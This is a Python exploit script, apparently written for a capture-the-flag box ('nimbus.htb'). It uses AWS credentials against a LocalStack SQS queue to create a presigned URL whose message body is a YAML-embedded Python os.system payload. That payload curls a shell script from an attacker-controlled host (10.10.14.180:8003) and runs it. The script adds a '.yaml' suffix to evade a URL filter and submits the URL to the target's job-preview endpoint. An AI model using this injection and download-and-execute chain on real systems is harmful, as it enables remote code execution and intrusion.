import boto3
import requests

ACCESS_KEY = "<REDACTED>"
SECRET_KEY = "<REDACTED>"
SESSION_TOKEN = ("<REDACTED_SESSION_TOKEN>")

LOCALSTACK = "http://172.18.0.2:4566"
QUEUE_URL = f"{LOCALSTACK}/<REDACTED_ACCOUNT_ID>/nimbus-jobs"

session = boto3.session.Session(
    aws_access_key_id=ACCESS_KEY,
    aws_secret_access_key=SECRET_KEY,
    aws_session_token=SESSION_TOKEN,
    region_name="us-east-1",
)
sqs = session.client("sqs", endpoint_url=LOCALSTACK)

bootstrap = '__import__("os").system("curl 10.10.14.180:8003/r.sh -o /tmp/r4.sh; sh /tmp/r4.sh")'
message_body = "script: '" + bootstrap + "'"

presigned_url = sqs.generate_presigned_url(
    "send_message",
    Params={"QueueUrl": QUEUE_URL, "MessageBody": message_body},
    ExpiresIn=300,
)
print("Presigned URL:")
print(presigned_url)
print()

final_url = presigned_url + "&x=.yaml"
r = requests.post("http://nimbus.htb/jobs/preview", data={"url": final_url}, timeout=20)
verdict = "BLOCKED" if "Security policy" in r.text else ("FETCHED" if "Fetched:" in r.text else "OTHER")
print("verdict:", verdict)
open("http/E36_presigned_response.txt", "w").write(r.text)
